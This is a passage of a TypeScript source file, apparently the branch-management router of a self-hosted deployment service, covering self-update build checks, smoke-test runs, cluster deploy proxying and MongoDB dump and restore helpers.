import http from 'node:http';
import https from 'node:https';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { execSync, spawn } from 'node:child_process';
import { createGzip } from 'node:zlib';
import { Router, type Request } from 'express';
import { StateService } from '../services/state.js';
import { resolveActorFromRequest } from '../services/actor-resolver.js';
import { WorktreeService } from '../services/worktree.js';
import { resolveEffectiveProfile } from '../services/container.js';
import type { ContainerService } from '../services/container.js';
import type { SchedulerService } from '../services/scheduler.js';
import type { ExecutorRegistry } from '../scheduler/executor-registry.js';
import type { BranchEntry, CdsConfig, IShellExecutor, OperationLog, OperationLogEvent, BuildProfile, RoutingRule, ServiceState, InfraService, DataMigration, MongoConnectionConfig, CdsPeer, ExecutorNode } from '../types.js';
import { discoverComposeFiles, parseComposeFile, parseComposeString, toComposeYaml, parseCdsCompose, toCdsCompose } from '../services/compose-parser.js';
import type { ComposeServiceDef } from '../services/compose-parser.js';
import { computeRequiredInfra } from '../services/deploy-infra-resolver.js';
import { combinedOutput } from '../types.js';
import { topoSortLayers } from '../services/topo-sort.js';
import { detectStack } from '../services/stack-detector.js';
import { assertProjectAccess } from './projects.js';
import { CheckRunRunner } from '../services/check-run-runner.js';
import { branchEvents, nowIso } from '../services/branch-events.js';
import { GitHubAppClient } from '../services/github-app-client.js';
import { classifyEnvKey } from '../config/known-env-keys.js';
import { isSafeGitRef } from '../services/github-webhook-dispatcher.js';
import { buildPreviewUrl } from '../services/comment-template.js';
import { computePreviewSlug } from '../services/preview-slug.js';
import { maskSecrets as maskSecretsText, shouldMask } from '../services/secret-masker.js';

/**
 * P4 Part 18 (hardening): pre-restart sanity check for self-update.
 *
 * Runs `pnpm install --frozen-lockfile` + `tsc --noEmit` inside the
 * CDS source dir BEFORE kill+spawn. Returns a structured result
 * that the self-update route uses to decide whether to proceed.
 *
 * Contract:
 *   - ok: true  → both stages succeeded, safe to restart
 *   - ok: false → first failing stage + stderr excerpt in error
 *
 * Why this is in its own function: it's called from two routes
 * (the real /self-update and the dry-run /self-update-dry-run).
 * Both share the exact same validation so an operator who pre-
 * validates gets the same result the live restart would.
 *
 * Timeouts:
 *   pnpm install — 300s (cold install can take a while on slow disks)
 *   tsc          — 120s (CDS is ~5k LOC, should finish in <10s)
 *
 * On a healthy CDS these run in 3-8 seconds combined because
 * frozen-lockfile is a near no-op when node_modules is current.
 */
export async function validateBuildReadiness(
  shell: IShellExecutor,
  cdsDir: string,
): Promise<
  | { ok: true; summary: string; webWarning?: string }
  | { ok: false; stage: 'install' | 'tsc'; error: string }
> {
  // Stage 1: pnpm install --frozen-lockfile (后端 cds/)
  const installResult = await shell.exec(
    'pnpm install --frozen-lockfile',
    { cwd: cdsDir, timeout: 300_000 },
  );
  if (installResult.exitCode !== 0) {
    const err = (combinedOutput(installResult) || 'pnpm install 失败').slice(0, 500);
    return { ok: false, stage: 'install', error: err };
  }

  // Stage 2: tsc --noEmit (后端 cds/) — 这步失败必 abort,因为新代码起不来
  const tscResult = await shell.exec(
    'npx tsc --noEmit',
    { cwd: cdsDir, timeout: 120_000 },
  );
  if (tscResult.exitCode !== 0) {
    const err = (combinedOutput(tscResult) || 'tsc --noEmit 失败').slice(0, 800);
    return { ok: false, stage: 'tsc', error: err };
  }

  // Stage 3: 前端 tsc(2026-05-04 v2 — production OOM 教训)
  // 前端 tsc 失败**不**阻断 self-update。理由:
  //   - 后端 tsc 失败 → node 起不来 → CDS 死翘 → 必须 abort
  //   - 前端 tsc 失败 → web build 也会失败 → 老 dist/ 继续 serve →
  //     用户感受是"UI 没变" → GlobalUpdateBadge 显示 bundleStale 红徽章 →
  //     用户主动来排查
  //
  // 加 NODE_OPTIONS=--max-old-space-size=4096 防 vite tsc -b 在小内存机器
  // 上 OOM(实测 production 1G 机器跑 tsc -b 会爆)。
  // 失败只 collect 到 webWarning 字段,SSE 流照常 send 'done',self-update 继续。
  const webDir = path.join(cdsDir, 'web');
  let webWarning: string | undefined;
  try {
    const webExists = fs.existsSync(path.join(webDir, 'package.json'));
    if (webExists) {
      const webInstall = await shell.exec(
        'pnpm install --frozen-lockfile',
        { cwd: webDir, timeout: 300_000 },
      );
      if (webInstall.exitCode !== 0) {
        webWarning = 'web pnpm install 失败 — web build 大概率会跟着失败,继续 self-update 但前端可能不更新';
      } else {
        // tsc -b 比直接 tsc --noEmit 多用 2-3x 内存,改用后者(单 tsconfig 编译)。
        // NODE_OPTIONS 提到 4G,绝大多数 vite 项目够用。
        const webTsc = await shell.exec(
          'npx tsc --noEmit',
          {
            cwd: webDir,
            timeout: 180_000,
            // Bugbot PR #524 第五轮:shell-executor 已 merge process.env,调用方
            // 只需传需要 override 的部分,不要再 spread。
            env: { NODE_OPTIONS: '--max-old-space-size=4096' },
          },
        );
        if (webTsc.exitCode !== 0) {
          const tail = (combinedOutput(webTsc) || '').slice(-800);
          webWarning = `前端 tsc 失败(self-update 继续,但前端 bundle 不会更新): ${tail}`;
        }
      }
    }
  } catch (err) {
    webWarning = `前端 tsc 异常(已忽略,self-update 继续): ${(err as Error).message}`;
  }

  return {
    ok: true,
    summary: webWarning
      ? `pnpm install + 后端 tsc 通过 — ⚠ 前端检查未过(self-update 继续)`
      : 'pnpm install + 后端 tsc + 前端 tsc 通过',
    webWarning,
  };
}

/**
 * Build the env object passed to smoke-all.sh. Whitelists shell-required
 * vars (PATH/HOME/...) + the SMOKE_* parameters + AI_ACCESS_KEY (note:
 * this is the project-level access key the smoke script feeds to the
 * target backend, not CDS's own CDS_AI_ACCESS_KEY).
 *
 * Reasons for the whitelist (instead of `...process.env, ...overrides`):
 *   - CDS process holds many sensitive vars (CDS_GITHUB_APP_PRIVATE_KEY,
 *     CDS_JWT_SECRET, CDS_BOOTSTRAP_TOKEN, CDS_MONGO_URI, ...). The smoke
 *     script doesn't need any of them; leaking them risks them ending up
 *     in stderr lines forwarded to SSE.
 *   - The whitelist makes "what the smoke script can see" auditable. New
 *     smoke needs a new env? Add it here, document the dependency.
 */
function buildSmokeEnv(opts: {
  previewHost: string;
  accessKey: string;
  impersonateUser?: string;
  skip?: string;
  failFast?: boolean;
}): NodeJS.ProcessEnv {
  const SHELL_PASSTHROUGH = ['PATH', 'HOME', 'USER', 'SHELL', 'TERM', 'TZ', 'TMPDIR', 'PWD', 'LANG'];
  const env: NodeJS.ProcessEnv = {};
  for (const key of SHELL_PASSTHROUGH) {
    if (process.env[key] !== undefined) env[key] = process.env[key];
  }
  // LC_*（locale 全套）放过，否则部分 awk/sort 报错
  for (const key of Object.keys(process.env)) {
    if (key.startsWith('LC_')) env[key] = process.env[key];
  }
  env.SMOKE_TEST_HOST = opts.previewHost;
  // AI_ACCESS_KEY here is the *project-level* key (用户在 dashboard
  // customEnv 里配的，给被测项目自己的 X-AI-Access-Key 用)，
  // 不要换成 CDS_AI_ACCESS_KEY —— 那是 CDS 自己的钥匙。
  env.AI_ACCESS_KEY = opts.accessKey;
  env.SMOKE_USER = opts.impersonateUser || 'admin';
  env.SMOKE_SKIP = opts.skip || '';
  env.SMOKE_FAIL_FAST = opts.failFast ? '1' : '';
  return env;
}

function reconcileBranchStatus(entry: BranchEntry): void {
  const statuses = Object.values(entry.services || {}).map((service) => service.status);
  if (statuses.some((status) => status === 'error')) entry.status = 'error';
  else if (statuses.some((status) => status === 'building')) entry.status = 'building';
  else if (statuses.some((status) => status === 'starting' || status === 'restarting')) entry.status = 'starting';
  else if (statuses.some((status) => status === 'running')) entry.status = 'running';
  else entry.status = 'idle';

  const failedReasons = Object.entries(entry.services || {})
    .filter(([, service]) => service.status === 'error')
    .map(([id, service]) => `${id}: ${service.errorMessage || '启动失败'}`);
  entry.errorMessage = failedReasons.length ? failedReasons.join('\n') : undefined;
}

function isPortConflictError(err: unknown): boolean {
  const text = err instanceof Error ? err.message : String(err);
  return /port is already allocated|bind: address already in use|address already in use|EADDRINUSE/i.test(text);
}

/**
 * Result of a single smoke-all.sh run — surface area shared between the
 * manual `/api/branches/:id/smoke` endpoint (Phase 3) and the auto-hook
 * triggered after a successful `/deploy` when `project.autoSmokeEnabled`
 * is true (Phase 4).
 */
export interface SmokeRunResult {
  exitCode: number | null;
  elapsedSec: number;
  passedCount: number;
  failedCount: number;
}

export interface SmokeRunOptions {
  branch: BranchEntry;
  previewHost: string;        // e.g. "https://my-branch.miduo.org"
  accessKey: string;           // resolved AI_ACCESS_KEY
  impersonateUser?: string;    // default 'admin'
  skip?: string;               // comma-separated smoke keys to skip
  failFast?: boolean;
  scriptDir: string;           // dir containing smoke-all.sh
  /** Per-line callback; receives the raw stdout/stderr line. */
  onLine?: (stream: 'stdout' | 'stderr', line: string) => void;
  /** Fires when the bash process exits or errors before exit. */
  onComplete?: (result: SmokeRunResult) => void;
  /** Fires when spawn itself fails (ENOENT, EACCES, etc). */
  onError?: (err: Error) => void;
}

/**
 * Spawn scripts/smoke-all.sh as a child process and fan out its output
 * via callbacks. Callers own the IO side (SSE, check-run update, etc.);
 * this helper just wraps the child-process bookkeeping + pass/fail
 * tally extraction so we don't copy-paste 60 lines of spawn boilerplate.
 *
 * Does NOT validate inputs — callers must have verified that smoke-all.sh
 * exists, that the branch has a preview URL, and that accessKey is
 * non-empty. This is a pure execution helper; validation belongs at the
 * HTTP boundary.
 *
 * Env isolation：历史上这里写的是 `env: { ...process.env, ... }`，等于
 * 把 CDS 进程的所有环境变量（含 CDS_GITHUB_APP_PRIVATE_KEY、
 * CDS_JWT_SECRET、CDS_BOOTSTRAP_TOKEN 等敏感值）整体透传给冒烟脚本。
 * 现改为 shell 必需变量 + SMOKE_* 显式参数 + AI_ACCESS_KEY 的白名单。
 * 冒烟脚本只需要这一小撮，其他一律隔离。
 */
export function runSmokeForBranch(opts: SmokeRunOptions): void {
  const smokeEntry = path.join(opts.scriptDir, 'smoke-all.sh');
  const child = spawn('bash', [smokeEntry], {
    cwd: opts.scriptDir,
    env: buildSmokeEnv({
      previewHost: opts.previewHost,
      accessKey: opts.accessKey,
      impersonateUser: opts.impersonateUser,
      skip: opts.skip,
      failFast: opts.failFast,
    }),
  });
  const startedAt = Date.now();
  let passed = 0;
  let failed = 0;

  const forward = (stream: NodeJS.ReadableStream, channel: 'stdout' | 'stderr') => {
    let buffer = '';
    stream.on('data', (chunk: Buffer) => {
      buffer += chunk.toString('utf8');
      let idx: number;
      while ((idx = buffer.indexOf('\n')) >= 0) {
        const line = buffer.slice(0, idx);
        buffer = buffer.slice(idx + 1);
        // Tally from the "✅ 通过: N 项" / "❌ 失败: N 项" footer lines
        // printed by smoke-all.sh. Not rely on exit code alone — the
        // footer is what CI / UI surface.
        if (line.startsWith('✅ 通过:') || line.startsWith('\u2705 通过:')) {
          const m = /通过:\s*(\d+)/.exec(line);
          if (m) passed = parseInt(m[1], 10);
        } else if (line.startsWith('❌ 失败:') || line.startsWith('\u274c 失败:')) {
          const m = /失败:\s*(\d+)/.exec(line);
          if (m) failed = parseInt(m[1], 10);
        }
        opts.onLine?.(channel, line);
      }
    });
  };
  forward(child.stdout!, 'stdout');
  forward(child.stderr!, 'stderr');

  child.on('error', (err) => {
    opts.onError?.(err);
  });

  child.on('close', (code) => {
    opts.onComplete?.({
      exitCode: code,
      elapsedSec: Math.round((Date.now() - startedAt) / 1000),
      passedCount: passed,
      failedCount: failed,
    });
  });
}

/**
 * Locate the smoke-all.sh script. Shared between the manual endpoint
 * and the auto-hook. Returns null when the script is missing so the
 * caller can decide between 500 error (manual endpoint) or warning
 * SSE line (auto-hook, best-effort).
 */
export function resolveSmokeScriptDir(): { dir: string; entry: string; exists: boolean } {
  const dir = process.env.CDS_SMOKE_SCRIPT_DIR
    || path.join(process.cwd(), 'scripts');
  const entry = path.join(dir, 'smoke-all.sh');
  return { dir, entry, exists: fs.existsSync(entry) };
}

export interface RouterDeps {
  stateService: StateService;
  worktreeService: WorktreeService;
  containerService: ContainerService;
  shell: IShellExecutor;
  config: CdsConfig;
  /** Optional warm-pool scheduler (v3.1). When absent, scheduler API returns disabled. */
  schedulerService?: SchedulerService;
  /**
   * Cluster executor registry (scheduler/standalone mode). When absent or
   * containing only an embedded master, deploys run locally. When a remote
   * executor is registered and the request either targets it explicitly or
   * lets the dispatcher pick, the deploy is proxied to the remote executor's
   * `/exec/deploy` HTTP SSE endpoint.
   */
  registry?: ExecutorRegistry;
  /**
   * Current scheduling strategy, read fresh on every dispatch so the
   * Dashboard's strategy radio takes effect immediately without restart.
   * Defaults to `least-load` if not provided.
   */
  getClusterStrategy?: () => 'least-branches' | 'least-load' | 'round-robin';
  /**
   * Optional GitHubAppClient — when provided, deploys post "CDS Deploy"
   * check runs back to GitHub so the PR's Checks panel mirrors CDS's
   * build status. Absent when CDS_GITHUB_APP_* env vars aren't set.
   */
  githubApp?: GitHubAppClient;
}

export function createBranchRouter(deps: RouterDeps): Router {
  const {
    stateService,
    worktreeService,
    containerService,
    shell,
    config,
    schedulerService,
    registry,
    getClusterStrategy,
    githubApp,
  } = deps;

  const router = Router();

  // PR_C.3: AI agent / cookie 真人 / 内部组件 三档解析。本地别名指向
  // services/actor-resolver.ts 的共享实现（Bugbot Low review：原本
  // bridge.ts 和这里各有一份一模一样的实现，新增 header 时容易漏一处）。
  const resolveActorForActivity = resolveActorFromRequest;

  const checkRunRunner = new CheckRunRunner({
    stateService,
    githubApp,
    config,
  });

  async function startInfraWithPortRetry(service: InfraService, projectId: string): Promise<InfraService> {
    let current = service;
    for (let attempt = 0; attempt < 5; attempt++) {
      try {
        // Phase 1: 传项目 customEnv 让 ${VAR} 展开
        await containerService.startInfraService(current, stateService.getCustomEnv(projectId));
        return current;
      } catch (err) {
        if (!isPortConflictError(err) || attempt === 4) throw err;
        const nextPort = stateService.allocatePort(config.portStart);
        stateService.updateInfraService(current.id, { hostPort: nextPort }, projectId);
        stateService.save();
        const updated = stateService.getInfraServiceForProjectAndId(projectId, current.id);
        if (!updated) throw err;
        current = updated;
      }
    }
    return current;
  }

  // ── Cluster dispatch helper ──
  //
  // Given an incoming deploy request, decide whether it should run locally on
  // this master (returns null) or proxied to a remote executor (returns the
  // executor node). The decision order:
  //
  //   1. Request body `targetExecutorId` — explicit user choice. Must exist
  //      and be online; if missing or offline we fall back to (3).
  //   2. Branch's sticky `entry.executorId` — if this branch was previously
  //      deployed to a specific executor and that executor is still online,
  //      keep it there (deploys are idempotent on target).
  //   3. Registry's `selectExecutor(strategy)` — pick the least-loaded online
  //      executor. If the pick is the embedded master itself, return null so
  //      the existing local code path runs.
  //   4. No registry at all (standalone mode, no cluster) — return null.
  //
  // Returning null means "run locally, unchanged from before cluster".
  // Returning an ExecutorNode means "dispatch this deploy via HTTP proxy".
  function resolveDeployTarget(
    entry: BranchEntry,
    explicitTargetId: string | undefined,
  ): ExecutorNode | null {
    if (!registry) return null;

    // Explicit target wins if valid.
    if (explicitTargetId) {
      const picked = registry.getAll().find(n => n.id === explicitTargetId);
      if (picked && picked.status === 'online') {
        return picked.role === 'embedded' ? null : picked;
      }
      // Explicit but invalid → fall through to auto
    }

    // Sticky: respect previous placement if still viable.
    if (entry.executorId) {
      const sticky = registry.getAll().find(n => n.id === entry.executorId);
      if (sticky && sticky.status === 'online') {
        return sticky.role === 'embedded' ? null : sticky;
      }
      // Previously-owned executor is gone → let dispatcher re-pick
    }

    // Auto-pick via the configured strategy.
    const online = registry.getOnline();
    const remoteOnline = online.filter(n => n.role !== 'embedded');
    if (remoteOnline.length === 0) {
      // No remote executors available — run locally.
      return null;
    }
    // Use the current Dashboard strategy, defaulting to least-load which
    // is the most real-world useful (weighted memory + CPU).
    const strategy = getClusterStrategy?.() || 'least-load';
    const picked = registry.selectExecutor(strategy);
    if (!picked || picked.role === 'embedded') return null;
    return picked;
  }

  /**
   * Proxy a deploy request to a remote executor's `/exec/deploy` endpoint.
   * Streams the executor's SSE response back to the client verbatim, so the
   * dashboard's transit page and log box render exactly the same experience
   * as a local deploy. Updates the master's state so the branch shows up as
   * "hosted on" the target executor.
   *
   * Design notes:
   *  - We use global `fetch` (Node 18+) with a streaming body reader. The
   *    readable stream's chunks are raw SSE bytes; we forward them untouched
   *    so step/log/complete/error events all flow through.
   *  - We set `entry.executorId` BEFORE making the remote call so concurrent
   *    status reads see the correct ownership. If the remote call fails we
   *    leave executorId set — next deploy attempt will hit the same executor
   *    (sticky) or fall through to re-selection if it's offline.
   *  - Auth: the master sends its `X-Executor-Token` so the remote's
   *    `/exec` middleware accepts the call. This token is the shared cluster
   *    secret minted during bootstrap.
   */
  async function proxyDeployToExecutor(
    executor: ExecutorNode,
    entry: BranchEntry,
    res: import('express').Response,
  ): Promise<void> {
    // SSE headers on client side — same shape the local deploy uses so the
    // frontend doesn't need to know whether it's local or remote.
    res.writeHead(200, {
      'Content-Type': 'text/event-stream',
      'Cache-Control': 'no-cache',
      Connection: 'keep-alive',
      'X-Accel-Buffering': 'no',
    });

    // Record the ownership eagerly so GET /api/branches reflects the new
    // placement even before deploy finishes. If something goes wrong, the
    // next retry will still target this executor (sticky).
    entry.executorId = executor.id;
    entry.status = 'building';
    stateService.save();

    // Tell the client we're proxying — gives the transit page a nice hint
    // and makes the log box show meaningful context on the very first event.
    const preamble = {
      step: 'dispatch',
      status: 'running',
      title: `派发到执行器 ${executor.id} (${executor.host}:${executor.port})`,
      timestamp: new Date().toISOString(),
    };
    res.write(`event: step\ndata: ${JSON.stringify(preamble)}\n\n`);

    // Prepare the payload the remote's /exec/deploy expects. The remote has
    // its own worktree + state, so we pass branch metadata + profiles + the
    // merged env var map and let it handle the rest.
    // P4 Part 17 (G2 fix): scope by the branch's project so a remote
    // executor only receives profiles owned by this project.
    const profiles = stateService.getBuildProfilesForProject(entry.projectId || 'default');
    const cdsEnv = stateService.getCdsEnvVars(entry.projectId || 'default');
    // Per-project scope: _global baseline + project override wins.
    const customEnv = stateService.getCustomEnv(entry.projectId || 'default');
    const mirrorEnv = stateService.getMirrorEnvVars();
    const env = { ...cdsEnv, ...mirrorEnv, ...customEnv };

    const payload = {
      branchId: entry.id,
      branchName: entry.branch,
      // 2026-04-24: thread the master's project attribution so the
      // executor stamps it on its local entry instead of falling back
      // to a hardcoded 'default'. Older executors that ignore this
      // field still resolve via resolveProjectForAutoBuild on their side.
      projectId: entry.projectId || 'default',
      profiles,
      env,
    };

    const upstreamUrl = `http://${executor.host}:${executor.port}/exec/deploy`;
    try {
      const upstream = await fetch(upstreamUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          ...(config.executorToken ? { 'X-Executor-Token': config.executorToken } : {}),
        },
        body: JSON.stringify(payload),
      });

      if (!upstream.ok || !upstream.body) {
        const errText = await (upstream.text ? upstream.text() : Promise.resolve('(no body)'));
        const errEvent = {
          message: `执行器拒绝部署请求 (HTTP ${upstream.status}): ${errText.slice(0, 200)}`,
        };
        res.write(`event: error\ndata: ${JSON.stringify(errEvent)}\n\n`);
        entry.status = 'error';
        entry.errorMessage = errEvent.message;
        stateService.save();
        return;
      }

      // Pipe the executor's SSE bytes directly to the client. Chunks may
      // contain partial events but SSE framing is newline-delimited so the
      // browser's EventSource parser handles boundaries correctly.
      const reader = upstream.body.getReader();
      const decoder = new TextDecoder('utf-8');
      let buffer = '';
      while (true) {
        const { done, value } = await reader.read();
        if (done) break;
        const chunk = decoder.decode(value, { stream: true });
        buffer += chunk;
        // Flush every complete SSE frame (terminated by blank line) so the
        // client sees updates promptly rather than waiting for the full
        // upstream response to arrive.
        try {
          res.write(chunk);
        } catch {
          // Client disconnected mid-stream — stop piping; the remote will
          // continue its build independently of this pipe going away.
          break;
        }
      }
      // If the upstream ended mid-event (rare), drain the final bytes.
      if (buffer.length > 0) {
        try { res.write(decoder.decode()); } catch { /* client gone */ }
      }

      // Master-side state is best-effort — the executor has the source of
      // truth via its next heartbeat, which will reconcile status.
      entry.lastAccessedAt = new Date().toISOString();
      stateService.save();
    } catch (err) {
      const msg = (err as Error).message;
      const errEvent = { message: `派发到执行器失败: ${msg}` };
      try { res.write(`event: error\ndata: ${JSON.stringify(errEvent)}\n\n`); } catch { /* ignore */ }
      entry.status = 'error';
      entry.errorMessage = errEvent.message;
      stateService.save();
    } finally {
      try { res.end(); } catch { /* ignore */ }
    }
  }

  // ── Preview port servers (port mode: per-branch proxy with path-prefix routing) ──
  const previewServers = new Map<string, http.Server>();

  function cleanupPreviewServer(branchId: string) {
    const server = previewServers.get(branchId);
    if (server) {
      server.close();
      previewServers.delete(branchId);
      const entry = stateService.getBranch(branchId);
      if (entry) {
        delete entry.previewPort;
        stateService.save();
      }
      console.log(`[preview] Closed preview proxy for "${branchId}"`);
    }
  }

  // ── Helper: merged env (CDS_* auto vars + customEnv, later wins) ──
  //
  // When `projectId` is supplied, two extra project-scoped vars get
  // injected BEFORE customEnv so compose YAMLs can template against
  // them (e.g. `MongoDB__DatabaseName: "prdagent-${CDS_PROJECT_SLUG}"`
  // gives each project its own database without shared-mongo risks):
  //
  //   CDS_PROJECT_ID   — opaque project id (e.g. "50bf3eac3d02")
  //   CDS_PROJECT_SLUG — URL-friendly slug ("prd-agent-2"); for legacy
  //                      default project this is the repoRoot basename,
  //                      preserving existing behaviour.
  //
  // customEnv always wins so an operator can override the slug-based
  // default from the Dashboard if needed.
  function getMergedEnv(projectId?: string): Record<string, string> {
    const cdsEnv = stateService.getCdsEnvVars(projectId);   // CDS_HOST, CDS_MONGODB_PORT, etc.
    const mirrorEnv = stateService.getMirrorEnvVars(); // npm/corepack mirror (if enabled)
    // Scoped custom env: _global when no projectId, else { _global..., <projectId>... }
    const customEnv = stateService.getCustomEnv(projectId);
    const projectEnv: Record<string, string> = {};
    if (projectId) {
      const project = stateService.getProject(projectId);
      if (project) {
        projectEnv.CDS_PROJECT_ID = project.id;
        projectEnv.CDS_PROJECT_SLUG = project.slug;
      }
    }
    return { ...cdsEnv, ...mirrorEnv, ...projectEnv, ...customEnv };
  }

  /** Mask sensitive env var values for trace logging */
  function maskSecrets(env: Record<string, string>): Record<string, string> {
    const SENSITIVE = /secret|password|token|key|credential/i;
    const masked: Record<string, string> = {};
    for (const [k, v] of Object.entries(env)) {
      masked[k] = SENSITIVE.test(k) ? '***' : v;
    }
    return masked;
  }

  // ── Helper: SSE setup ──
  function initSSE(res: import('express').Response) {
    res.writeHead(200, {
      'Content-Type': 'text/event-stream',
      'Cache-Control': 'no-cache',
      Connection: 'keep-alive',
      'X-Accel-Buffering': 'no',
    });
  }

  function sendSSE(res: import('express').Response, event: string, data: unknown) {
    try {
      res.write(`event: ${event}\ndata: ${JSON.stringify(data)}\n\n`);
    } catch { /* client disconnected */ }
  }

  /**
   * Phase 4: optionally run scripts/smoke-all.sh after a successful
   * deploy, piggy-backing SSE events on the deploy stream as
   * `smoke-start` / `smoke-line` / `smoke-complete`. Returns the
   * result so the caller can fold it into the GitHub check-run
   * conclusion (Phase 5).
   *
   * All failure paths emit exactly one `smoke-skip` line and resolve
   * with null so the deploy flow keeps going. This is intentionally
   * best-effort — smoke is diagnostic, not a gate.
   */
  async function maybeRunAutoSmoke(
    res: import('express').Response,
    entry: BranchEntry,
    deployFailed: boolean,
  ): Promise<SmokeRunResult | null> {
    if (deployFailed) return null;
    const project = stateService.getProject(entry.projectId || 'default');
    if (!project?.autoSmokeEnabled) return null;

    const emitSkip = (reason: string) => {
      try {
        res.write(`event: smoke-skip\ndata: ${JSON.stringify({ reason })}\n\n`);
      } catch { /* client gone */ }
    };

    const previewHost = config.previewDomain || config.rootDomains?.[0];
    if (!previewHost) {
      emitSkip('preview_host_missing');
      return null;
    }
    // 走 buildPreviewUrl 全栈唯一入口，公式同 v3（tail-prefix-projectSlug）。
    const smokeHost = buildPreviewUrl(previewHost, entry.branch, project.slug);
    if (!smokeHost) {
      emitSkip('preview_host_missing');
      return null;
    }

    // 走 per-project merged env：project.customEnv 覆盖旧 state._global / state[<projectId>]。
    const mergedEnv = stateService.getCustomEnv(entry.projectId);
    const accessKey = (mergedEnv?.AI_ACCESS_KEY || '').trim();
    if (!accessKey) {
      emitSkip('access_key_missing');
      return null;
    }

    const script = resolveSmokeScriptDir();
    if (!script.exists) {
      emitSkip('smoke_script_missing');
      return null;
    }

    sendSSE(res, 'smoke-start', { host: smokeHost, branchId: entry.id });

    return new Promise<SmokeRunResult | null>((resolve) => {
      runSmokeForBranch({
        branch: entry,
        previewHost: smokeHost,
        accessKey,
        scriptDir: script.dir,
        failFast: true, // CI-style — first failure stops the chain
        onLine: (channel, text) => sendSSE(res, 'smoke-line', { stream: channel, text }),
        onError: (err) => {
          sendSSE(res, 'smoke-line', { stream: 'stderr', text: `[auto-smoke] ${err.message}` });
          sendSSE(res, 'smoke-complete', { exitCode: -1, elapsedSec: 0, passedCount: 0, failedCount: 0, error: err.message });
          resolve(null);
        },
        onComplete: (result) => {
          sendSSE(res, 'smoke-complete', result);
          resolve(result);
        },
      });
    });
  }

  /**
   * Compute current container capacity status.
   * Returns `current / max` — when `current >= max` the host is considered
   * over-subscribed and the caller should warn (or, with scheduler enabled,
   * trigger LRU eviction before spawning new containers).
   *
   * Duplicates the logic in `GET /branches` so deploy-time decisions don't
   * depend on the client having fetched capacity first.
   * See doc/design.cds-resilience.md §四.1.
   */
  function computeCapacity(): { current: number; max: number; totalMemGB: number } {
    const totalMemGB = Math.round(os.totalmem() / (1024 * 1024 * 1024));
    const max = Math.max(2, (totalMemGB - 1) * 2);
    let current = 0;
    for (const b of stateService.getAllBranches()) {
      for (const svc of Object.values(b.services)) {
        if (svc.status === 'running' || svc.status === 'building' || svc.status === 'starting') {
          current++;
        }
      }
    }
    return { current, max, totalMemGB };
  }

  /** Write deploy event to stdout (captured by cds.log when running in background) */
  function logDeploy(branchId: string, message: string) {
    const ts = new Date().toISOString().slice(11, 19);
    console.log(`  [deploy:${branchId}] ${ts} ${message}`);
  }

  /** Download MongoDB database tools binary (platform-independent fallback) */
  async function installMongoToolsBinary(sh: IShellExecutor, send: (msg: string) => void) {
    const archResult = await sh.exec('uname -m');
    const arch = archResult.stdout.trim();
    const isArm = arch === 'aarch64' || arch === 'arm64';
    const platform = isArm ? 'arm64' : 'x86_64';
    const url = `https://fastdl.mongodb.org/tools/db/mongodb-database-tools-debian12-${platform}-100.10.0.deb`;
    send(`正在下载 MongoDB 工具 (${platform})...`);
    // Try dpkg if debian-based, otherwise extract manually
    const dlResult = await sh.exec(
      `cd /tmp && curl -fsSL -o mongo-tools.deb "${url}" 2>&1 && dpkg -x mongo-tools.deb /tmp/mongo-tools-extracted 2>&1 && cp /tmp/mongo-tools-extracted/usr/bin/mongo* /usr/local/bin/ 2>&1 && chmod +x /usr/local/bin/mongo* && rm -rf /tmp/mongo-tools.deb /tmp/mongo-tools-extracted`,
      { timeout: 120000 }
    );
    if (dlResult.exitCode !== 0) {
      // Try tarball as absolute fallback
      send('deb 安装失败，尝试 tarball...');
      const tgzUrl = `https://fastdl.mongodb.org/tools/db/mongodb-database-tools-linux-${platform}-100.10.0.tgz`;
      await sh.exec(
        `cd /tmp && curl -fsSL -o mongo-tools.tgz "${tgzUrl}" && tar xzf mongo-tools.tgz && cp mongodb-database-tools-*/bin/mongo* /usr/local/bin/ && chmod +x /usr/local/bin/mongo* && rm -rf /tmp/mongo-tools.tgz /tmp/mongodb-database-tools-*`,
        { timeout: 120000 }
      );
    }
    send('MongoDB 工具已安装');
  }

  // ─────────────────────────────────────────────────────────────────
  //   Migration pipeline helpers (shared by /execute, local-dump, local-restore)
  // ─────────────────────────────────────────────────────────────────

  /**
   * Build the mongodump argument list for a resolved connection.
   * Always uses `--archive --gzip` so the output is a single streamable blob.
   */
  function buildMongodumpArgs(
    host: string,
    port: number,
    auth: { username?: string; password?: string; authDatabase?: string },
    database: string | undefined,
    collections: string[] | undefined,
  ): string[] {
    const args: string[] = ['--host', host, '--port', String(port), '--archive', '--gzip'];
    if (auth.username) args.push('--username', auth.username);
    if (auth.password) args.push('--password', auth.password);
    if (auth.authDatabase) args.push('--authenticationDatabase', auth.authDatabase);
    if (database) args.push('--db', database);
    if (collections && collections.length === 1) {
      // mongodump only supports --collection when --db is set + single collection
      args.push('--collection', collections[0]);
    }
    // For multi-collection migrations, dump the whole db and let --nsInclude filter on restore
    return args;
  }

  function buildMongorestoreArgs(
    host: string,
    port: number,
    auth: { username?: string; password?: string; authDatabase?: string },
    opts: { drop: boolean; sourceDb?: string; targetDb?: string; collections?: string[] },
  ): string[] {
    const args: string[] = ['--host', host, '--port', String(port), '--archive', '--gzip'];
    if (auth.username) args.push('--username', auth.username);
    if (auth.password) args.push('--password', auth.password);
    if (auth.authDatabase) args.push('--authenticationDatabase', auth.authDatabase);
    if (opts.drop) args.push('--drop');
    // Cross-database rename: --nsFrom="srcDb.*" --nsTo="tgtDb.*"
    if (opts.sourceDb && opts.targetDb && opts.sourceDb !== opts.targetDb) {
      args.push('--nsFrom', `${opts.sourceDb}.*`, '--nsTo', `${opts.targetDb}.*`);
    }
    if (opts.sourceDb && opts.collections && opts.collections.length > 0) {
      // Filter to only these collections
      for (const col of opts.collections) {
        args.push('--nsInclude', `${opts.sourceDb}.${col}`);
      }
    }
    return args;
  }

  /**
   * Parse a line of mongodump/mongorestore progress output and return a
   * human-readable one-liner, or null if the line carries no useful signal.
   *
   * Example inputs:
   *   "2026-04-10T23:41:12.419+0200 [####........] prdagent.users 500/4105 (12.2%)"
   *   "2026-04-10T23:41:10.660+0200 writing prdagent.users to /dev/stdout"
   *   "2026-04-10T23:41:30.660+0200 done dumping prdagent.users (4105 documents)"
   */
  function parseMongoProgressLine(line: string): string | null {
    const trimmed = line.trim();
    if (!trimmed) return null;
    // Progress bar line: "[####....] db.col 500/4105 (12.2%)"
    const bar = trimmed.match(/\]\s+([^\s]+)\s+(\d+)\/(\d+)\s+\(([\d.]+)%\)/);
